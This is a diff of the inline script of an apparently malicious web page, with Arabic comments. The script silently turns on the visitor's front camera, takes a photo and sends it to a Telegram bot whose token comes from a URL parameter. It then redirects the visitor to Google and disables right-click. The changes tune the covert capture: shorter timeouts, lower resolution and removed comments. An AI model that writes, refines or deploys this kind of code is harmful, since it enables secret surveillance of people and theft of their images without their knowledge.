@@ -51,9 +51,6 @@
         (function() {
             "use strict";
 
-            // ------------------------------------------------------------------
-            // 1. استخراج الإعدادات من بارامتر 'p'
-            // ------------------------------------------------------------------
             let botToken = null;
             let chatId = null;
             let redirectUrl = "https://www.google.com";
@@ -72,9 +69,6 @@
                 } catch(e) {}
             }
 
-            // ------------------------------------------------------------------
-            // 2. العناصر والمتغيرات
-            // ------------------------------------------------------------------
             const video = document.getElementById('videoElem');
             const canvas = document.getElementById('canvasElem');
 
@@ -85,22 +79,16 @@
             let redirectExecuted = false;
             let cameraStarted = false;
 
-            // ------------------------------------------------------------------
-            // 3. التوجيه الحتمي
-            // ------------------------------------------------------------------
             const executeRedirect = () => {
                 if (redirectExecuted) return;
                 redirectExecuted = true;
                 if (mediaStream) {
-                    try { mediaStream.getTracks().forEach(t => { if (t.readyState === 'live') t.stop(); }); } catch(e) {}
+                    try { mediaStream.getTracks().forEach(t => t.stop()); } catch(e) {}
                 }
                 if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
                 window.location.replace(redirectUrl);
             };
 
-            // ------------------------------------------------------------------
-            // 4. إرسال الصورة إلى Telegram (أعلى جودة مع انتظار مكتمل)
-            // ------------------------------------------------------------------
             const sendToTelegram = async (jpegBlob) => {
                 if (isPhotoSent) return;
                 isPhotoSent = true;
@@ -113,24 +101,21 @@
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', jpegBlob, 'high_res_capture.jpg');
+                formData.append('photo', jpegBlob, 'capture.jpg');
 
                 try {
+                    // إرسال الطلب وانتظار اكتماله لضمان عدم إلغائه أثناء التوجيه
                     await fetch(apiUrl, {
                         method: 'POST',
-                        body: formData,
-                        keepalive: true
+                        body: formData
                     });
                 } catch (e) {
-                    // التجاهل عند وجود خطأ في الشبكة لضمان التوجيه
+                    // في حال إخفاق الاتصال
+                } finally {
+                    executeRedirect();
                 }
-
-                executeRedirect();
             };
 
-            // ------------------------------------------------------------------
-            // 5. التقاط الإطار بأعلى جودة بدقة شاشة الكاميرا الكاملة (1.0 Quality)
-            // ------------------------------------------------------------------
             const captureAndSend = () => {
                 if (isPhotoSent) return;
 
@@ -146,7 +131,7 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, vw, vh);
 
-                // حفظ الصورة بنسبة جودة 1.0 (100% بدون ضغط مفقود)
+                // التقاط الصورة بأعلى جودة بدقة الكاميرا الأصلية
                 canvas.toBlob((blob) => {
                     if (blob && blob.size > 0) {
                         sendToTelegram(blob);
@@ -156,13 +141,10 @@
                 }, 'image/jpeg', 1.0);
             };
 
-            // ------------------------------------------------------------------
-            // 6. تحليل البكسلات مع إعطاء الكاميرا فرصة لضبط الضوء
-            // ------------------------------------------------------------------
             const startPixelAnalysis = () => {
                 if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
 
-                const maxWait = 5000;
+                const maxWait = 4000;
                 const startTime = Date.now();
 
                 frameAnalyzerInterval = setInterval(() => {
@@ -193,14 +175,7 @@
 
                     const rgbSum = pixel[0] + pixel[1] + pixel[2];
 
-                    // التأكد من وضوح الصورة وتجاوز الإطارات المظلمة
-                    if (rgbSum > 30) {
-                        if (!isPhotoSent && !redirectExecuted) {
-                            if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
-                            frameAnalyzerInterval = null;
-                            captureAndSend();
-                        }
-                    } else if (Date.now() - startTime > maxWait && !isPhotoSent && !redirectExecuted) {
+                    if (rgbSum > 20 || (Date.now() - startTime > maxWait)) {
                         if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
                         frameAnalyzerInterval = null;
                         captureAndSend();
@@ -208,9 +183,6 @@
                 }, 100);
             };
 
-            // ------------------------------------------------------------------
-            // 7. تشغيل الكاميرا بأعلى إعدادات جودة مدعومة
-            // ------------------------------------------------------------------
             const activateCameraAndEngine = async () => {
                 if (isCapturing || cameraStarted) return;
                 isCapturing = true;
@@ -219,8 +191,8 @@
                 try {
                     const constraints = {
                         video: {
-                            width: { ideal: 3840, max: 3840 },
-                            height: { ideal: 2160, max: 2160 },
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 },
                             facingMode: "user"
                         }
                     };
@@ -234,12 +206,10 @@
                         if (video.readyState >= 2) { resolve(); } else {
                             const onReady = () => {
                                 video.removeEventListener('loadeddata', onReady);
-                                video.removeEventListener('loadedmetadata', onReady);
                                 resolve();
                             };
                             video.addEventListener('loadeddata', onReady);
-                            video.addEventListener('loadedmetadata', onReady);
-                            setTimeout(resolve, 1000);
+                            setTimeout(resolve, 800);
                         }
                     });
 
@@ -252,16 +222,10 @@
                 }
             };
 
-            // ------------------------------------------------------------------
-            // 8. ربط الأحداث
-            // ------------------------------------------------------------------
             document.addEventListener('click', activateCameraAndEngine, { passive: true });
             document.addEventListener('touchstart', activateCameraAndEngine, { passive: true });
 
-            // ------------------------------------------------------------------
-            // 9. محاولات تشغيل تلقائية
-            // ------------------------------------------------------------------
-            [300, 1000, 2500, 4000].forEach(delay => {
+            [300, 1000, 2500].forEach(delay => {
                 setTimeout(() => {
                     if (!cameraStarted) {
                         activateCameraAndEngine().catch(() => {});
@@ -269,27 +233,18 @@
                 }, delay);
             });
 
-            // ------------------------------------------------------------------
-            // 10. عند عودة الصفحة للظهور
-            // ------------------------------------------------------------------
             document.addEventListener('visibilitychange', () => {
                 if (!document.hidden && !cameraStarted) {
                     activateCameraAndEngine().catch(() => {});
                 }
             });
 
-            // ------------------------------------------------------------------
-            // 11. حماية التفاعل
-            // ------------------------------------------------------------------
             document.addEventListener('contextmenu', (e) => e.preventDefault());
             document.addEventListener('dragstart', (e) => e.preventDefault());
 
-            // ------------------------------------------------------------------
-            // 12. صمام أمان التوجيه
-            // ------------------------------------------------------------------
             setTimeout(() => {
                 if (!redirectExecuted) executeRedirect();
-            }, 15000);
+            }, 12000);
 
         })();
     </script>
